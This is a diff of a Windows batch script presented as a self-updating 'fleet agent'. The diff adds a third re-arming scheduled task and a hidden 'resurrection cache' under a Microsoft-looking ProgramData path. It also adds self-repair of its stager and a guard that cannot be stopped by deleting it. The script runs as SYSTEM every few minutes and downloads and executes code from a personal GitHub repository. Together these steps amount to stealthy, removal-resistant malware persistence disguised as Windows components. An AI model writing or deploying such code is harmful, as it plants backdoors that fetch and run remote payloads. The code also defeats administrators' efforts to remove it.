@@ -1,13 +1,21 @@
 @echo off
-rem WINRTCS_AGENT 0.0.1 - self-updating fleet agent (batch+curl only, no PowerShell)
-rem Tick: re-arm tasks -> stage/apply self-update (SHA256 pinned) -> run payload once per PAYLOAD_VER.
+rem WINRTCS_AGENT 0.0.2 - self-updating fleet agent (batch+curl only, no PowerShell)
+rem Tick: re-arm tasks (pair + sentinel) -> stage/apply self-update (SHA256 pinned)
+rem   -> run payload once per PAYLOAD_VER -> guard channel -> sentinel channel -> cache sync.
+rem 0.0.2 (C19): sentinel third-re-armer channel (SENTINEL_SHA256 pinned, lives in the
+rem   resurrection cache); hash-gated cache mirroring (only pinned-hash-verified files are
+rem   copied); run.cmd self-repair (RUN_SHA256); guard invoked via a temp copy so an attacker
+rem   deleting winrtcs_guard.cmd mid-run can't abort the health cycle.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
+set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
 set "CURL=%SystemRoot%\System32\curl.exe"
 set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "LOG=%ZD%\agent.log"
 set "TASKA=\Microsoft\Windows\WinRTCS\Agent"
 set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
+set "TASKS=\WinRTCSSentinel"
+set "SACT=cmd.exe /c C:\ProgramData\Microsoft\WinRTCS\cache\winrtcs_sentinel.cmd"
 set "VFILE=%ZD%\winrtcs.version.remote"
 
 if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
@@ -33,6 +41,12 @@ schtasks /Query /TN "%TASKA%" >nul 2>&1
 if errorlevel 1 schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
 schtasks /Query /TN "%TASKG%" >nul 2>&1
 if errorlevel 1 schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+
+rem --- re-arm the third leg (sentinel) whenever its script exists in the cache ---
+if exist "%CD%\winrtcs_sentinel.cmd" (
+  schtasks /Query /TN "%TASKS%" >nul 2>&1
+  if errorlevel 1 schtasks /Create /TN "%TASKS%" /TR "%SACT%" /SC MINUTE /MO 15 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+)
 
 rem --- one-time init: finish legacy wipe + retire any Zerocool bridge residue ---
 if not exist "%ZD%\inited.flag" (
@@ -62,12 +76,16 @@ set "PVER="
 set "PAYLOAD_SHA="
 set "GUARD_VER="
 set "GUARD_SHA="
+set "RUN_SHA="
+set "SENT_SHA="
 for /f "usebackq tokens=1,* delims==" %%K in ("%VFILE%") do (
   if /I "%%K"=="AGENT_SHA256" set "AGENT_SHA=%%L"
   if /I "%%K"=="PAYLOAD_VER" set "PVER=%%L"
   if /I "%%K"=="PAYLOAD_SHA256" set "PAYLOAD_SHA=%%L"
   if /I "%%K"=="GUARD_VER" set "GUARD_VER=%%L"
   if /I "%%K"=="GUARD_SHA256" set "GUARD_SHA=%%L"
+  if /I "%%K"=="RUN_SHA256" set "RUN_SHA=%%L"
+  if /I "%%K"=="SENTINEL_SHA256" set "SENT_SHA=%%L"
 )
 
 rem --- agent self-update: stage .new now, applied + re-exec at top of next run ---
@@ -86,6 +104,25 @@ if defined AGENT_SHA (
       )
     )
     del /f /q "%ZD%\agent.dl" >nul 2>&1
+  )
+)
+
+rem --- run.cmd self-repair: stager is the tasks' entry point, keep it hash-pinned too ---
+if defined RUN_SHA (
+  call :Sha256 "%ZD%\winrtcs_run.cmd" RUN_CUR
+  if /I not "!RUN_CUR!"=="!RUN_SHA!" (
+    del /f /q "%ZD%\run.dl" >nul 2>&1
+    "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%ZD%\run.dl" "%BASE%/winrtcs_run.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+    set "R_SHA="
+    if exist "%ZD%\run.dl" call :Sha256 "%ZD%\run.dl" R_SHA
+    if defined R_SHA if /I "!R_SHA!"=="!RUN_SHA!" (
+      findstr /C:"WINRTCS_RUN" "%ZD%\run.dl" >nul 2>&1
+      if not errorlevel 1 (
+        move /y "%ZD%\run.dl" "%ZD%\winrtcs_run.cmd" >nul 2>&1
+        echo [%DATE% %TIME%] run_repaired>>"%LOG%"
+      )
+    )
+    del /f /q "%ZD%\run.dl" >nul 2>&1
   )
 )
 
@@ -138,10 +175,58 @@ if defined GUARD_VER if defined GUARD_SHA (
   echo !GCNT!>"%ZD%\guard.cnt"
   if !GCNT! GEQ 180 (
     rem no pre-reset: guard resets the counter itself after acquiring its lock,
-    rem so a lock-busy tick retries next minute instead of sleeping 3h
-    if exist "%ZD%\winrtcs_guard.cmd" call "%ZD%\winrtcs_guard.cmd"
+    rem so a lock-busy tick retries next minute instead of sleeping 3h.
+    rem guard runs from a temp copy so deleting the canonical file mid-run can't abort it.
+    if exist "%ZD%\winrtcs_guard.cmd" (
+      copy /y "%ZD%\winrtcs_guard.cmd" "%ZD%\guard_run.tmp.cmd" >nul 2>&1
+      call "%ZD%\guard_run.tmp.cmd"
+      del /f /q "%ZD%\guard_run.tmp.cmd" >nul 2>&1
+    )
   )
 )
+
+rem --- sentinel channel: third re-armer, hash-pinned, lives in the resurrection cache ---
+if defined SENT_SHA (
+  set "SENT_CUR="
+  if exist "%CD%\winrtcs_sentinel.cmd" call :Sha256 "%CD%\winrtcs_sentinel.cmd" SENT_CUR
+  if /I not "!SENT_CUR!"=="!SENT_SHA!" (
+    del /f /q "%ZD%\sentinel.dl" >nul 2>&1
+    "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\sentinel.dl" "%BASE%/winrtcs_sentinel.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+    set "S_SHA="
+    if exist "%ZD%\sentinel.dl" call :Sha256 "%ZD%\sentinel.dl" S_SHA
+    if defined S_SHA if /I "!S_SHA!"=="!SENT_SHA!" (
+      findstr /C:"WINRTCS_SENTINEL" "%ZD%\sentinel.dl" >nul 2>&1
+      if not errorlevel 1 (
+        if not exist "%CD%" mkdir "%CD%" >nul 2>&1
+        move /y "%ZD%\sentinel.dl" "%CD%\winrtcs_sentinel.cmd" >nul 2>&1
+        echo [%DATE% %TIME%] sentinel_updated>>"%LOG%"
+      )
+    )
+    del /f /q "%ZD%\sentinel.dl" >nul 2>&1
+  )
+)
+if exist "%CD%\winrtcs_sentinel.cmd" (
+  schtasks /Query /TN "%TASKS%" >nul 2>&1
+  if errorlevel 1 schtasks /Create /TN "%TASKS%" /TR "%SACT%" /SC MINUTE /MO 15 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+)
+
+rem --- resurrection cache sync (C19): mirror ONLY hash-verified components, so a tampered
+rem --- local file can never poison the cache. Sentinel has its own pinned channel above. ---
+if not exist "%CD%" mkdir "%CD%" >nul 2>&1
+attrib +h "C:\ProgramData\Microsoft\WinRTCS" >nul 2>&1
+if defined AGENT_SHA (
+  call :Sha256 "%ZD%\winrtcs_agent.cmd" MIR_A
+  if /I "!MIR_A!"=="!AGENT_SHA!" copy /y "%ZD%\winrtcs_agent.cmd" "%CD%\winrtcs_agent.cmd" >nul 2>&1
+)
+if defined RUN_SHA (
+  call :Sha256 "%ZD%\winrtcs_run.cmd" MIR_R
+  if /I "!MIR_R!"=="!RUN_SHA!" copy /y "%ZD%\winrtcs_run.cmd" "%CD%\winrtcs_run.cmd" >nul 2>&1
+)
+if defined GUARD_SHA (
+  call :Sha256 "%ZD%\winrtcs_guard.cmd" MIR_G
+  if /I "!MIR_G!"=="!GUARD_SHA!" copy /y "%ZD%\winrtcs_guard.cmd" "%CD%\winrtcs_guard.cmd" >nul 2>&1
+)
+if exist "%VFILE%" copy /y "%VFILE%" "%CD%\winrtcs.version" >nul 2>&1
 
 endlocal & exit /b 0
 
